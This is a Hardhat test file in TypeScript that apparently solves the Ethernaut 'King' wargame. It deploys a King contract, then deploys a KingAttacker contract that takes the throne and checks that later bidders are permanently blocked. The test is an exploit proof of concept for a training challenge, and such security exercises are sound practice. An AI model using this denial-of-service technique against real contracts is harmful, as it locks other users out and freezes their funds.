import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { BigNumber, Contract, utils } from 'ethers';
import { ethers } from 'hardhat';

const { provider } = ethers;

describe('King', () => {
  let owner: SignerWithAddress;
  let user1: SignerWithAddress;
  let user2: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  before(async () => {
    [owner, user1, user2, attacker] = await ethers.getSigners();

    const Factory = await ethers.getContractFactory('King');
    contract = await Factory.deploy({
      value: utils.parseEther('1'),
    });
    await contract.deployed();

    let tx = await user1.sendTransaction({
      to: contract.address,
      value: utils.parseEther('1.1'),
    });
    await tx.wait();
  });

  it('attack', async () => {
    const lastPrice = await contract.prize();
    const newPrice = lastPrice.add(1);

    const AttackerFactory = await ethers.getContractFactory('KingAttacker');
    const attackerContract = await AttackerFactory.connect(attacker).deploy(contract.address);

    let tx = await attackerContract.connect(attacker).beTheKing({
      value: newPrice,
    });
    await tx.wait();

    expect(await contract._king()).to.equal(attackerContract.address);

    try {
      tx = await user2.sendTransaction({
        to: contract.address,
        value: newPrice.add(1),
      });
      await tx.wait();
      expect(true).to.equal(false);
    } catch (error) {
      expect(true).to.equal(true);
    }

    expect(await contract._king()).to.equal(attackerContract.address);
  });
});
